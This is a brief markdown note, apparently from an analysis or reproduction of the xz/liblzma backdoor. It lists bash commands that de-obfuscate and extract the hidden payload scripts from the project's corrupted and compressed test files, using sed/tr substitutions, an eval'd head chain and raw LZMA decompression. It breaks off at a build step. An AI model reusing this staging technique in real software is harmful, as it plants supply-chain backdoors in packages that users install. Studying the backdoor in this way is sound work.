# xz exploit

decompress `good-large_compressed.lzma`
```bash
xz -dc files/good-large_compressed.lzma > files/good-large_compressed.txt
```

uncorrupt and decompress `bad-3-corrupt_lzma2.xz` (doesn't work on macOS):
```bash
sed "r\n" files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d > files/bad-3-corrupt_lzma2.bash 2>/dev/null
```

extract code from decompressed `good-large_compressed.lzma` (doesn't work on macOS):
```bash
export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +939)"
```
```bash
(xz -dc files/good-large_compressed.lzma | eval $i | tail -c +31233 | tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")| xz -F raw --lzma1 -dc > files/injected.bash
```

build the `liblzma_la-crc64-fast.o` file: